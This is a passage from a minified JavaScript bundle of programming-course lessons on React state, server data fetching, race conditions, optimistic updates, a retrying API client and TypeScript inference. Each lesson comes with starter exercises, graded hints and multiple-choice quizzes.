2. **Never mutate \`state\` in place.** The bail-out and the selector both rely on identity. Always assign a new object.

This is how Redux, Zustand and Jotai work underneath — you've just built the 40-line version.`,quiz:[{q:"`useSyncExternalStore` exists to…",options:["Replace useState","Subscribe React components to state that lives outside React, safely with concurrent rendering","Cache API responses","Persist state to disk"],answer:1,explanation:"It's the official bridge for external sources — no tearing, and it works with React's concurrent renderer."},{q:"Why bail out of `setState` when nothing changed?",options:["To save memory","Without it, every redundant write re-renders every subscriber","React throws otherwise","To keep the store immutable"],answer:1,explanation:"Notifying unconditionally turns harmless writes into render storms — the exact failure the exercise's duplicate setState catches."},{q:"`subscribe` must return…",options:["The new state","A promise","An unsubscribe function","The listener list"],answer:2,explanation:"React calls it to clean up on unmount or when the subscription target changes. Leaking listeners is a slow memory leak."},{q:"The main advantage of a store with selectors over context is…",options:["Less code","Components re-render only for the slice they select, not for any change","It works without hooks","It serialises automatically"],answer:1,explanation:"Fine-grained subscriptions are the fix for context's all-or-nothing re-render behaviour."}]},{id:"server-state",title:"Server State ≠ Client State",minutes:12,reading:!0,body:`The most expensive mistake in React data code is treating **server state** like client state. They behave nothing alike.

| | Client state | Server state |
| --- | --- | --- |
| Owner | You | Someone else's database |
| Latency | Instant | 50–2000ms |
| Freshness | Authoritative | A snapshot that goes stale |
| Failure | You own the bug | Network, 500s, timeouts |

**Consequences you must design for:** loading, error, empty, and *stale-but-present* are all real states — and the last one is why good apps show old data while refetching instead of blanking the screen.

**The four questions every fetch answers:**

\`\`\`
Where does the data live while loading?   → a cache, keyed by query
What if it fails?                         → an error state with retry
When is it refetched?                     → on focus, on reconnect, on mutation
What if two requests race?                → ignore the older response
\`\`\`

**Don't hand-roll a cache.** Writing \`useEffect\` + \`useState\` per component gives you duplicate in-flight requests, no shared cache, and races on rapid navigation. Use a purpose-built tool — **TanStack Query**, **SWR**, or a framework's built-in loader (Convex and Next.js both ship one). You get, without writing them:

- a shared cache keyed by query
- **stale-while-revalidate**: show cached data instantly, refresh in the background
- deduplication of identical in-flight requests
- automatic retry with backoff
- invalidation after a mutation

**Separate the two kinds of state.** Cached server data belongs to the query cache; genuinely local UI state (which tab is open, an unsaved draft) belongs in React. Merging them is how you end up with a \`useEffect\` that refetches on every render.

**Mutations need an explicit post-condition.** After a write, either **invalidate** the affected queries so they refetch (simple, always correct) or update the cache optimistically (fast, needs rollback). Choose per case — a like button wants optimistic; a payment confirmation wants invalidation.

**Own the errors.** A raw \`Failed to fetch\` in the UI is a bug report, not a message. Translate failures into something a person can act on: what failed, whether it's retryable, and what to do next.`,quiz:[{q:"The defining difference between server and client state is…",options:["Server state is bigger","You don't own it — it's an asynchronous snapshot that goes stale and can fail","Server state can't be cached","Client state is always synchronous"],answer:1,explanation:"Ownership, latency, staleness and failure modes all differ — which is why they need different tools."},{q:"Stale-while-revalidate means…",options:["Show a spinner until fresh data arrives","Render cached data immediately while quietly refetching in the background","Never refetch","Refetch only on reload"],answer:1,explanation:"Users see content instantly and it corrects itself. Blanking the screen on every refetch throws away information they already had."},{q:"Why avoid a hand-rolled useEffect fetch per component?",options:["It's more code","No shared cache, duplicated requests, and races on fast navigation","useEffect is deprecated","It can't set state"],answer:1,explanation:"A real query layer gives caching, dedupe, retries and race handling that per-component effects can't coordinate."},{q:"After a successful mutation you should…",options:["Nothing — the server handles the UI","Invalidate affected queries, or update the cache optimistically with a rollback path","Reload the page","Clear the whole cache"],answer:1,explanation:"Invalidation is simple and always correct; optimistic updates are faster but need a rollback for the failure case."}]},{id:"capstone-state-machine",title:"Capstone: A Guarded Checkout State Machine",minutes:20,starter:`// A checkout state machine. Only the transitions in TRANSITIONS are legal.
// "next" advances; "back" retreats to the previous step if allowed;
// anything else leaves the state untouched.
const TRANSITIONS = {
  cart: ["address"],
  address: ["payment", "cart"],
  payment: ["done", "address"],
  done: [],
};

const PREVIOUS = { address: "cart", payment: "address", done: "payment" };

function reducer(state, event) {
  // TODO: implement the "next" and "back" transitions using TRANSITIONS.
  return state;
}

function run(events) {
  return events.reduce(reducer, "cart");
}

console.log("happy path:", run(["next", "next", "next"]));
console.log("illegal skip:", run(["next", "next", "next", "next"]));
console.log("one step back:", run(["next", "next", "back"]));
console.log("no back from cart:", run(["back"]));`,check:{expr:'output.includes("happy path: done") && output.includes("illegal skip: done") && output.includes("one step back: address") && output.includes("no back from cart: cart")',hint:"Read the allowed transitions from TRANSITIONS before moving. `back` uses PREVIOUS and must be ignored when the current step has no legal predecessor.",hints:[{tier:1,text:"`next` should only move if the current step lists a forward transition. What does a fixed state list mean?"},{tier:2,text:"For `next`, take `TRANSITIONS[state][0]` when it exists. For `back`, use `PREVIOUS[state]` — but only if that step exists."},{tier:3,text:"next: `const forward = TRANSITIONS[state]; return forward.length ? forward[0] : state;`. back: `return PREVIOUS[state] ?? state;`"}]},body:'Everything in this track converges here: a real, guarded, testable state machine. The rule that makes "done" mean something is that **illegal transitions must be impossible** — not merely unlikely.\n\n**The transition table is the specification.** Every box and arrow of the checkout flow is data:\n\n```\ncart ──next──▶ address ──next──▶ payment ──next──▶ done\n                 ◀──back──        ◀──back──        ◀──back──\n```\n\nThere is no arrow from `cart` backwards, and none out of `done`. That\'s the whole design, and it\'s why the fourth `next` in your exercise must be a **no-op** rather than an error: a well-built machine ignores impossible events instead of crashing on them.\n\n**Why this beats booleans.** A naive checkout uses `step`, plus `canSubmit`, plus `isComplete`. Three truths that can disagree. The machine has one: `state`. Everything else is derived from the transition table.\n\n**Guards are where your business rules live.** A real checkout also needs:\n- cannot reach `payment` with an empty cart\n- cannot reach `done` without a successful payment response\n- `back` from `done` is refused (you\'d have to issue a refund)\n\nIn a reducer these are ordinary `if`s at the top — one place, fully testable, no component involved.\n\n**Side effects stay out of the reducer.** Submitting payment is an effect, not a transition. The action says *what happened* (`{ type: "payment_succeeded", id }`); the reducer only records it. That separation is what lets you unit-test the entire flow with an array of events — exactly what `run(events)` above does.\n\n**Testing the machine is the payoff.** No renderer, no mocks:\n\n```\nexpect(run(["next", "next", "next"])).toBe("done");\nexpect(run(["next", "next", "next", "next"])).toBe("done");   // ignored\nexpect(run(["back"])).toBe("cart");                            // refused\n```\n\n**Where to take it next:** persist `state` so a refresh resumes checkout; log every event for analytics; render the UI by switching on `state` and nothing else. And when the flow grows, the same reducer moves to the server — because a state machine doesn\'t care where it runs.',quiz:[{q:"Why is an illegal transition a no-op rather than a crash?",options:["Errors are hard to debug","A well-formed machine ignores impossible events; crashing would let a stray event take down the flow","React requires it","It's faster"],answer:1,explanation:"The guard's job is to make the bad state unreachable. Returning the current state keeps the machine total and predictable."},{q:"Where do you unit-test a checkout flow?",options:["With a rendering library and user-event clicks","On the reducer directly — pure events in, state out","Only in end-to-end tests","In the browser console"],answer:1,explanation:"Purity is the gift: no renderer, no network, no flakiness — a full flow is one array of events."},{q:"Submitting payment inside the reducer is wrong because…",options:["It's slow","Effects make the reducer impure — non-deterministic and untestable. The action should record what happened instead","Reducers can't call APIs","React batches it"],answer:1,explanation:"Keep the reducer pure: the effect lives outside and dispatches the outcome as an action."},{q:"What replaces the pile of booleans in a machine-driven UI?",options:["More booleans","One state value, with everything else derived from the transition table","Global variables","Refs"],answer:1,explanation:"A single source of truth removes the class of bug where canSubmit and isComplete disagree."}]}]},_P={id:"api",title:"API Integration & Data Fetching",blurb:"Talk to real services: HTTP, errors, races, optimistic updates, and a resilient client.",numeral:"XIII",lessons:[{id:"http-verbs",title:"HTTP, REST & Status Codes",minutes:12,starter:`// A mock REST server is mounted on fetch for this lesson.
// GET /api/users returns a JSON array of { id, name, role }.
async function main() {
  const res = await fetch("/api/users");

  // TODO: parse the response body before reading the fields below.
  const users = [];

  console.log("status:", res.status);
  console.log("count:", users.length);
  console.log("first:", users[0] && users[0].name);
  console.log("roles:", users.map((u) => u.role).join(","));
}

main();`,check:{expr:'output.includes("status: 200") && output.includes("first: Ada") && output.includes("roles: engineer,designer,manager")',hint:"`res` is a Response, not the data. Await res.json() to read the parsed body, then map over it.",hints:[{tier:1,text:"`fetch` resolves to a Response object describing the reply — not the body itself."},{tier:2,text:"Reading a JSON body is asynchronous: `await res.json()`."},{tier:3,text:"`const users = await res.json();` — one line, before the console.log calls."}]},body:`**REST is a naming convention for resources**, and it's worth internalising because you'll consume dozens of APIs shaped like it.

The URL names a **noun**; the HTTP method is the **verb**:

\`\`\`
GET    /api/users        → 200 [ … ]     list
POST   /api/users        → 201 { … }     create
GET    /api/users/42     → 200 { … }     read one
PATCH  /api/users/42     → 200 { … }     partial update
DELETE /api/users/42     → 204 _         delete
GET    /api/users/99     → 404 { error } not found
POST   /api/users (bad)  → 400 { error } validation failed
\`\`\`

**Status codes are the contract.** The leading digit tells you who to blame and what to do:

| Range | Meaning | Your move |
| --- | --- | --- |
| **2xx** | Success | Read the body |
| **3xx** | Redirect | Follow it (fetch does this for you) |
| **4xx** | *You* sent something wrong | Fix the request — retrying won't help |
| **5xx** | *The server* failed | Retry with backoff |

That 4xx/5xx split is the single most useful thing to remember, and it drives the retry logic you'll build in the capstone.

**The fetch trap.** A 404 is **not** a rejection. \`fetch\` only rejects on network failure, so you must check \`res.ok\` yourself:

\`\`\`
const res = await fetch("/api/users/99");
console.log(res.status, res.ok);   // 404 false — and no throw

if (!res.ok) {
  throw new Error("Request failed: " + res.status);
}
const user = await res.json();     // never reached
\`\`\`

Forgetting \`res.ok\` is the most common bug in frontend API code: you get a 404 HTML page and then a confusing parse error three lines later.

**Two more habits worth forming now.** Send \`Content-Type: application/json\` on writes, or the server may not parse your body. And treat the response as **untrusted shape** — you know what the API *promised*, not what it *sent*.`,quiz:[{q:"`fetch` rejects its promise when…",options:["The server returns 500","The server returns 404","The network request itself fails","The JSON is malformed"],answer:2,explanation:"HTTP error statuses are successful responses as far as fetch is concerned. You must check res.ok."},{q:"POST /api/users succeeds and creates a resource. The status should be…",options:["200","201","204","302"],answer:1,explanation:"201 Created — and the response typically echoes the new resource with its server-assigned id."},{q:"Which failure should NOT be retried automatically?",options:["503 Service Unavailable","500 Internal Server Error","400 Bad Request","Network timeout"],answer:2,explanation:"4xx means your request was wrong. Retrying an identical bad request just wastes time — fix the payload."},{q:"PATCH differs from PUT in that PATCH…",options:["Creates the resource","Partially updates the resource, leaving unspecified fields alone","Deletes the resource","Is read-only"],answer:1,explanation:"PUT replaces the whole representation; PATCH merges the fields you send."}]},{id:"fetch-async",title:"Errors, Ordering & the Missing Await",minutes:13,debug:vi("missing-await"),body:`Async code fails in quieter ways than sync code. The bug below is the most common one in the entire ecosystem, and it produces a **plausible value instead of an exception** — which is exactly why it survives review.

\`\`\`
let user;
fetchUser().then((u) => {
  user = u;
});
console.log(user);          // undefined — the callback hasn't run yet
\`\`\`

**\`.then\` schedules; \`await\` suspends.** Those are different operations and mixing them up is the bug above. Inside an \`async\` function, reach for \`await\` whenever you need the value *now*:

\`\`\`
const user = await fetchUser();
console.log(user);          // the value exists
\`\`\`

**Errors must be caught, or they vanish.** An unhandled rejection is silent — no crash, no UI feedback, just a request that never resolves into anything:

\`\`\`
try {
  const res = await fetch("/api/users/99");
  if (!res.ok) throw new Error("HTTP " + res.status);
  return await res.json();
} catch (err) {
  // Network failure, bad status, or malformed JSON all land here.
  // Translate it — "Failed to fetch" is not a message a user can act on.
  throw new Error("Couldn't load users. Check your connection and retry.");
} finally {
  setLoading(false);           // runs on both paths
}
\`\`\`

**\`finally\` is where cleanup belongs.** Turning off a spinner in both \`try\` and \`catch\` means one of them will eventually be forgotten.

**Parallel beats serial.** Independent requests should not queue:

\`\`\`
// ✗ ~2× the latency for no reason
const users = await getUsers();
const posts = await getPosts();

// ✓ both in flight at once
const [users, posts] = await Promise.all([getUsers(), getPosts()]);
\`\`\`

**But \`Promise.all\` fails fast** — one rejection rejects the whole thing and the other results are discarded. When partial success is acceptable, use \`Promise.allSettled\` and handle each outcome.

**And never forget \`await\` inside a \`try\`.** \`try { fetch(url) } catch\` catches nothing, because the rejection happens in a promise you never awaited.`,quiz:[{q:"`fetchScore().then(n => score = n)` followed immediately by `console.log(score)` prints the old value because…",options:["console.log is asynchronous",".then schedules a callback and returns immediately — it doesn't pause the function","fetchScore is broken","The promise resolved too fast"],answer:1,explanation:"Await suspends the function until the value exists; .then only registers work to run later."},{q:"Inside a try block, which is safe?",options:["`try { doAsync() } catch {}` — fire and forget","`try { await doAsync() } catch {}`","Either works the same","Neither catches async errors"],answer:1,explanation:"Without await, the rejection belongs to a promise you never observed, so the catch block never runs."},{q:"`Promise.all([a, b])` where `a` rejects…",options:["Resolves with b's value","Rejects immediately and discards b's result","Waits for b then rejects","Never settles"],answer:1,explanation:"all() fails fast. Use Promise.allSettled when you want every outcome regardless of failures."},{q:"Cleanup that must run on both success and failure belongs in…",options:["try","catch","finally","a separate effect"],answer:2,explanation:"finally runs on every path, which is why spinners and locks get released there."}]},{id:"loading-errors",title:"The Four States of Every Request",minutes:11,sort:{prompt:"A user opens a screen backed by a cached API. Order what a well-built UI does, earliest first.",items:["render cached data immediately (or a skeleton if there is none)","fire the request in the background","on success, replace the cached data with the fresh response","on failure, keep the cached data and surface a retry affordance"],explanation:"Showing what you already have beats showing a spinner, and a failed background refetch should never blank a screen the user is already reading. This is stale-while-revalidate."},reading:!0,body:`Every request has **four** outcomes, and a UI that only handles two of them will look broken to real users.

**1. Loading** — show structure, not a spinner. A skeleton that mirrors the final layout prevents the whole page jumping when data lands.

**2. Empty** — a successful response with nothing in it. \`[]\` is not an error, and "no results yet" deserves its own copy and a next step. This state ships missing more often than any other.

**3. Error** — say what failed and offer a way forward. A retry button is the minimum; a raw \`Failed to fetch\` is a bug report leaking into the interface.

**4. Stale** — data you already have, being refreshed. The best state, and the one beginners skip:

\`\`\`
if (isLoading && !data) return <Skeleton />;     // nothing to show yet
if (error && !data)     return <ErrorState onRetry={refetch} />;
if (!data.length)       return <EmptyState />;
return <List items={data} isRefreshing={isLoading} />;   // stale is fine
\`\`\`

That cascade is deliberately ordered: a background refetch failure should **never** replace content the user is already reading.

**Model the state as one union, not three booleans.**

\`\`\`
// ✗ four impossible combinations you must defend against
{ isLoading, isError, data }

// ✓ exactly one state, always
| { status: "loading" }
| { status: "empty" }
| { status: "error"; message: string }
| { status: "ready"; data: T; refreshing: boolean }
\`\`\`

**Never render raw error text.** Map failures to sentences a person can act on — "Couldn't reach the server. Retrying…" plus a manual retry — and keep the technical detail in your logs.

**Also design the slow case.** At 200ms a spinner is invisible; at 8 seconds the user has left. A skeleton plus an optimistic UI plus a timeout is what makes a slow API feel merely *delayed* rather than broken.`,quiz:[{q:"An API returns `[]` with status 200. That is…",options:["An error state","A successful empty result that needs its own UI","A loading state","A 404 in disguise"],answer:1,explanation:"Empty is a real, common outcome. Without dedicated copy users assume the app is broken."},{q:"A background refetch fails while fresh data is already on screen. You should…",options:["Replace the content with an error page","Keep the existing data and surface a retry affordance","Clear the cache","Reload the page"],answer:1,explanation:"Never blank content the user is reading — that's the stale state earning its place in the cascade."},{q:"Why prefer a status union over `isLoading`/`isError` booleans?",options:["Fewer characters","It makes impossible combinations — loading AND error AND empty — unrepresentable","It renders faster","React requires it"],answer:1,explanation:"Three independent booleans encode eight states, most of them nonsense you then have to defend against."},{q:"During loading, the most useful thing to render is…",options:["A centred spinner","A skeleton that mirrors the final layout","A blank screen",'"Loading…" text'],answer:1,explanation:"Skeletons preserve layout and perceived speed — the page doesn't jump when the real content arrives."}]},{id:"abort-races",title:"Races, Aborts & Debounce",minutes:13,starter:`// The classic stale-response race: requests finish out of order and an
// old result overwrites a newer one. Only the newest request may render.
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

let latest = 0;
const rendered = [];

async function load(query, delay) {
  const id = ++latest; // this request's ticket

  await sleep(delay);

  // TODO: bail out when a newer request has started since this one began.

  rendered.push(query);
}

async function main() {
  // "b" finishes first but is the stalest — it must not render.
  await Promise.all([
    load("a", 60),
    load("b", 10),
    load("c", 30),
  ]);

  console.log("rendered:", rendered.join(","));
}

main();`,check:{expr:'output.includes("rendered: c")',hint:'Each call takes a ticket. Before rendering, compare your ticket with the newest one — if they differ, a newer request has superseded you. Only "c" may render.',hints:[{tier:1,text:"All three loads start at once, so every one knows its own ticket number. What tells you whether you're still the newest?"},{tier:2,text:"After the sleep, compare `id` with `latest`. If `latest` has moved on, this response is obsolete."},{tier:3,text:"`if (id !== latest) return;` immediately after the await, before pushing."}]},body:`The user types "re", you fire a request per keystroke, and the replies come back in whatever order the network decides. Now a slow response for \`"r"\` lands *after* the fast response for \`"react"\` — and the UI shows the wrong results. **Nothing threw an error.** This is a race condition, and it's the defining bug of interactive data fetching.

**Guard 1 — a sequence ticket.** Cheap, dependency-free, and enough in most cases:

\`\`\`
let latest = 0;

async function load(query) {
  const id = ++latest;
  const data = await fetchResults(query);
  if (id !== latest) return;   // a newer request has superseded us
  setResults(data);
}
\`\`\`

**Guard 2 — actually cancel the request.** \`AbortController\` tells the browser to stop, which saves bandwidth and lets you distinguish a cancellation from a real failure:

\`\`\`
useEffect(() => {
  const controller = new AbortController();

  fetch(url, { signal: controller.signal })
    .then((r) => r.json())
    .then(setData)
    .catch((err) => {
      if (err.name === "AbortError") return;  // expected, not a bug
      setError(err);
    });

  return () => controller.abort();   // cancel on unmount or re-run
}, [url]);
\`\`\`

That cleanup is also what prevents the **"set state on an unmounted component"** warning: aborting means the \`.then\` never runs.

**Guard 3 — debounce the input.** Don't fire on every keystroke; wait for a pause:

\`\`\`
useEffect(() => {
  const t = setTimeout(() => search(query), 300);
  return () => clearTimeout(t);   // a newer keystroke cancels the pending call
}, [query]);
\`\`\`

**You need all three for different reasons.** Debounce reduces *how many* requests you make; abort cancels the ones already in flight; the ticket guard discards a response that slipped through anyway (caching layers, retries, and slow connections all create them).

**How to spot this class of bug:** if a UI sometimes shows results for a query the user has already replaced, suspect ordering — not your rendering logic.`,quiz:[{q:"A stale response overwrites a newer one. What kind of bug is that?",options:["A memory leak","A race condition caused by responses arriving out of order","A CORS problem","A stale cache"],answer:1,explanation:"Completion order isn't request order. Guard with a ticket and/or abort."},{q:"`AbortError` should normally be…",options:["Shown to the user as a failure","Ignored — it means the request was cancelled on purpose","Retried immediately","Logged as a critical error"],answer:1,explanation:"Cancellation is planned, not a failure. Filter it out before showing an error state."},{q:"Debouncing the input mainly…",options:["Cancels in-flight requests","Reduces how many requests you fire in the first place","Sorts the results","Caches the responses"],answer:1,explanation:"It delays until typing pauses — fewer requests. Abort handles the ones already sent; the ticket guard handles the rest."},{q:"Returning `controller.abort()` from a useEffect cleanup prevents…",options:["CORS errors","State updates from a response that arrives after unmount or after the deps changed","JSON parse errors","Rate limiting"],answer:1,explanation:"The abort stops the chain from calling setState on a component that has moved on."}]},{id:"optimistic",title:"Optimistic Updates & Cache Invalidation",minutes:12,reading:!0,body:`Perceived speed is a design decision, not a network property. **Optimistic updates** are how you make a 400ms round-trip feel instant.

**The pattern has three beats:** apply the change locally *now*, send the request, and **reconcile** — roll back on failure.

\`\`\`
async function toggleLike(id) {
  const previous = items;                       // 1. snapshot
  setItems(items.map((i) => i.id === id ? { ...i, liked: !i.liked } : i));

  try {
    await api.toggleLike(id);                   // 2. send
  } catch {
    setItems(previous);                         // 3. roll back
    toast("Couldn't save that. Try again.");
  }
}
\`\`\`

**The rollback is not optional.** Without it a failed write leaves the UI confidently showing state the server never accepted — the worst kind of bug, because everything *looks* right.

**Only go optimistic when all three hold:**
1. **The write almost always succeeds** — a like, a toggle, a draft autosave.
2. **The change is instantly reversible** — you can describe the "before" state exactly.
3. **Losing it wouldn't hurt** — cosmetic, not financial.

A payment confirmation fails all three, so it waits for the server. That's not a UX compromise; it's correctness.

**Invalidation is the other half.** After a write, related cached data is now wrong. Two strategies:

- **Invalidate** the affected queries and let them refetch. Simple, always correct, and costs a round-trip.
- **Write the result into the cache** directly (or optimistically), with invalidation as the fallback. Fast, but you now own correctness.

With a query library both are one call — \`queryClient.invalidateQueries({ queryKey: ["todos"] })\`. The rule of thumb: **invalidate broadly when in doubt.** A redundant refetch is invisible; a stale screen is a bug report.

**Concurrent mutations are the hard case.** Two optimistic writes to the same record can interleave, and the second rollback can resurrect the first's data. Real systems tag each optimistic entry with an id and reconcile by matching ids — not by replacing whole objects.

**Finally, always show the pending state.** A subtle pulse or a "saving…" label tells the user their action registered. Silence during a slow write is what makes people click twice.`,quiz:[{q:"The essential third step of an optimistic update is…",options:["Refetching everything","Rolling back when the request fails","Showing a toast","Disabling the button"],answer:1,explanation:"Without a rollback the UI can show a change the server rejected — a silent, misleading bug."},{q:"Which is a poor fit for optimistic UI?",options:["Liking a post","Toggling a setting","Confirming a payment","Renaming a draft"],answer:2,explanation:"Payments must wait for an authoritative server response — the cost of being wrong is unbounded."},{q:"After a mutation, the safest default is to…",options:["Do nothing","Invalidate the affected queries so they refetch authoritative data","Clear the whole cache","Reload the page"],answer:1,explanation:"Invalidation is simple and always correct. Optimistic cache writes are the faster, riskier option."},{q:"Why show a pending state during a write?",options:["It's decorative","It confirms the action registered, so users don't click again","It speeds up the request","It prevents rollbacks"],answer:1,explanation:'Silence during a slow write reads as "nothing happened" — which is how double-submissions happen.'}]},{id:"capstone-api-client",title:"Capstone: A Retrying, Resilient API Client",minutes:22,starter:`// A resilient API client. The transport is injected, so the whole thing is
// deterministic and testable without a network — the pattern real clients use.
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

function makeTransport(failuresBeforeSuccess) {
  let calls = 0;
  return async (path) => {
    calls += 1;
    if (calls <= failuresBeforeSuccess) {
      return { ok: false, status: 503, json: async () => ({ error: "unavailable" }) };
    }
    return { ok: true, status: 200, json: async () => ({ path, calls }) };
  };
}

// \`retries\` is the number of RETRIES, so total attempts = retries + 1.
async function request(transport, path, { retries = 3, baseDelay = 5 } = {}) {
  const res = await transport(path);

  // TODO:
  //  - throw immediately on a 4xx (retrying a bad request never helps)
  //  - retry 5xx up to \`retries\` times, waiting baseDelay * 2 ** attempt
  //  - throw a clear error once the retries are exhausted
  return res;
}

async function main() {
  const flaky = makeTransport(2);
  const res = await request(flaky, "/api/users", { retries: 3, baseDelay: 5 });
  const body = await res.json();
  console.log("recovered after retries:", res.status, body.calls);

  const dead = makeTransport(9);
  try {
    await request(dead, "/api/users", { retries: 3, baseDelay: 5 });
    console.log("should not reach here");
  } catch (err) {
    console.log("gave up after 4 attempts:", err.message);
  }
}

main();`,check:{expr:'output.includes("recovered after retries: 200 3") && output.includes("gave up after 4 attempts:")',hint:"Retry only on 5xx, with exponential backoff. The flaky transport needs 3 attempts to succeed; the dead one must exhaust 1 + 3 attempts and then throw.",hints:[{tier:1,text:"Wrap the call in a loop over attempts. After each failure decide: retryable (5xx) or fatal (4xx)?"},{tier:2,text:"Loop `for (let attempt = 0; attempt <= retries; attempt++)` and `await sleep(baseDelay * 2 ** attempt)` before retrying."},{tier:3,text:"After the loop ends without success, `throw new Error(...)`. Return the response on any ok, and throw right away when `res.status < 500`."}]},body:`This is the piece of plumbing every production app eventually needs and almost nobody writes deliberately the first time: a **client** that owns transport concerns so your components don't have to.

**Why a client instead of bare \`fetch\` at each call site:**

- **Retries live in one place.** Backoff, jitter and "which errors are retryable" stop being copy-paste.
- **Typed results.** One place to validate and map the response into your domain types.
- **Auth and headers.** Tokens, locale, tracing ids — attached once.
- **Testable.** Inject a transport and every behaviour is deterministic in a unit test. That's exactly what this exercise does.

**Exponential backoff, and why it's not optional.** Retrying immediately turns a brief outage into a self-inflicted denial of service: every client hammers the recovering server in lockstep.

\`\`\`
attempt 0 → immediate
attempt 1 → wait baseDelay × 2
attempt 2 → wait baseDelay × 4
attempt 3 → wait baseDelay × 8
\`\`\`

Real clients add **jitter** — a random 0–30% spread — so thousands of clients don't retry on the same millisecond. And they **cap** the delay, because 2^20 seconds is not a retry, it's a hang.

**Retry the right things.** The status code tells you:
- **5xx** — the server broke. Retry.
- **Network error / timeout** — worth retrying.
- **4xx** — *your* request was wrong. Retrying is pointless; surface it.
- **429** — rate limited. Retry, but honour \`Retry-After\`.

**Only retry idempotent requests by default.** A GET is safe to repeat; a POST that might have already created the resource is not — unless the API supports idempotency keys. That distinction prevents duplicate charges and double-created records.

**Errors deserve a taxonomy, not a string.** "Retryable and transient", "your fault — fix the input", "not authorised", "not found" are handled *differently*, so model them differently. A single \`Error("Request failed")\` forces the caller to re-parse the message to decide anything.

**Finish the loop: surface the outcome.** Exhausted retries become a UI state with a manual retry and a request id — so a support conversation has something to search for. A retrying client that fails silently is worse than no retry at all.`,quiz:[{q:"`retries = 3` means the total number of attempts is…",options:["3","4","6","Unlimited"],answer:1,explanation:"One initial attempt plus three retries. Naming it `retries` rather than `attempts` is exactly why the distinction has to be written down."},{q:"Exponential backoff exists because…",options:["It's faster","Immediate synchronized retries turn a brief outage into a self-inflicted overload","Servers require it","It reduces payload size"],answer:1,explanation:"Spreading retries out gives a struggling server room to recover. Jitter prevents clients retrying in lockstep."},{q:"Which response should not be retried?",options:["503","500","422 Unprocessable Entity","Network timeout"],answer:2,explanation:"4xx means the request itself was wrong — an identical retry fails identically. Fix and resend."},{q:"Injecting the transport instead of calling fetch directly gives you…",options:["A smaller bundle","Deterministic unit tests — you can simulate 503s, slow replies and failures precisely","Automatic caching","Better performance"],answer:1,explanation:"Dependency injection turns unreliable I/O into controllable input, which is what makes retry logic testable at all."},{q:"Why is blind retrying of POST dangerous?",options:["It's slower","The first attempt may have succeeded, so a retry creates a duplicate resource or charge","POST can't be retried by spec","Servers block repeated POSTs"],answer:1,explanation:"POST isn't idempotent. Retry it only with an idempotency key, or when you can confirm the write didn't land."}]}]},FP={id:"typescript",title:"TypeScript for Real Projects",blurb:"The real compiler runs in your editor: write types, watch diagnostics with line and column, and ship code the compiler has already argued with.",numeral:"XIV",lessons:[{id:"annotations",title:"Annotations, Inference & Structural Typing",minutes:12,lang:"ts",starter:`// The signature is the contract — the body is your job.
function clamp(n: number, lo: number, hi: number): number {
  // TODO: return n limited to the [lo, hi] range
  return n;
}

function average(nums: number[]): number {
  // TODO: sum divided by length — 0 for an empty list
  return 0;
}

function repeat(text: string, times: number): string {
  // TODO: text repeated \`times\` times (empty string when times <= 0)
  return text;
}

console.log("clamp:", clamp(12, 0, 10), clamp(-3, 0, 10), clamp(5, 0, 10));
console.log("average:", average([2, 4, 9]));
console.log("average empty:", average([]));
console.log("repeat:", JSON.stringify(repeat("ab", 3)));`,check:{expr:`output.includes("clamp: 10 0 5") && output.includes("average: 5") && output.includes("average empty: 0") && output.includes('repeat: "ababab"')`,hint:"The signatures already tell you every return type. Bound the number on both sides, guard the empty array before dividing, and let String.repeat do the joining.",hints:[{tier:1,text:"All three TODOs are one-liners — read the contract (the signature) and work inward from what it promises."},{tier:2,text:"clamp → Math.max then Math.min (or the reverse with the bounds swapped). average → reduce the array, but only after checking nums.length. repeat → String.prototype.repeat, remembering that a negative count throws."},{tier:3,text:'clamp → `Math.min(hi, Math.max(lo, n))`. average → `nums.length ? nums.reduce((a, b) => a + b, 0) / nums.length : 0`. repeat → `times <= 0 ? "" : text.repeat(times)`.'}]},body:`TypeScript's first gift is **inference** — most of the time you write no types at all and still get checking, because the compiler reads the initializer:

\`\`\`
let count = 0;        // number — can be reassigned to any number
const limit = 10;     // the literal 10 — cannot become 11
count = 5;            // ✓
limit = 11;           // ✗ Type '11' is not assignable to type '10'
\`\`\`

**Annotations are for the places inference has nothing to read.** Function parameters have no initializer, so the compiler can't guess — under \`strict\` an unannotated parameter is an error, not a free \`any\`:

\`\`\`
function total(nums) { … }        // ✗ Parameter implicitly has an 'any' type
function total(nums: number[]) { … }  // ✓ a contract you can rely on
\`\`\`

**The rule of thumb:** annotate the *boundary* — function signatures, exported declarations, values you intentionally widen — and let inference work everywhere in between. Annotating every local variable is noise that makes refactors harder, not easier.

\`\`\`
const names = users.map((u) => u.name);   // string[] — inference got this right
function names(users: User[]): string[] { … }  // the boundary says it out loud
\`\`\`

**Structural typing: TypeScript checks shape, not pedigree.** There are no nominal class names to match — if the structure fits, it fits:

\`\`\`
type User = { id: number; name: string };

const ada = { id: 1, name: "Ada", email: "ada@x.dev" };  // extra field
const u: User = ada;         // ✓ structural match — extra fields are fine

const assign: User = { id: 1, name: "Ada", email: "x" }; // ✗ fresh literal:
// excess property check — you promised a User and added a field the
// compiler can see you'll never read through that reference.
\`\`\`

That second case is the one that surprises people: the *freshness* of the literal triggers the excess-property check. The same object through a variable is perfectly assignable.

| Write | The compiler infers |
| --- | --- |
| \`let n = 0\` | \`number\` (widens — reassignment allowed) |
| \`const n = 0\` | \`0\` (literal — locked) |
| \`const xs = [1, 2]\` | \`number[]\` |
| \`function f(a: number)\` | return inferred from the body |
| \`function f(a)\` | error under \`strict\` — annotate it |

**Why this matters beyond red squiggles.** A type is a proof obligation the compiler discharges *before* anyone runs the code. The three functions in the exercise are trivial — the point is that their contracts travel: every future caller gets checked against the same promise, and a refactor that breaks one shows up at compile time instead of in a bug report.`,quiz:[{q:"Inference means TypeScript can usually figure out…",options:["Types from initializers and return expressions, so locals need no annotation","Types only inside class bodies","The intent of your code and refactor it for you","Nothing without a tsconfig"],answer:0,explanation:"The initializer is the evidence: `let n = 0` is a number. Parameters have no evidence, so they must be annotated."},{q:"`const limit = 10; limit = 11;` under strict mode…",options:["Compiles — 11 is a number","Errors — the const was inferred as the literal 10","Errors only if noUnusedLocals is on","Widens limit to number automatically"],answer:1,explanation:"`const` locks the literal type. That's exactly why `const` also stops accidental reassignment — value and type move together."},{q:"Structural typing means two types are compatible when…",options:["They share a class name","They were declared in the same file","One's structure satisfies the other's — names are irrelevant","Both use the `interface` keyword"],answer:2,explanation:"Shape decides: an object with id and name satisfies `User` whatever it was called or where it came from."},{q:'This errors: `const u: User = { id: 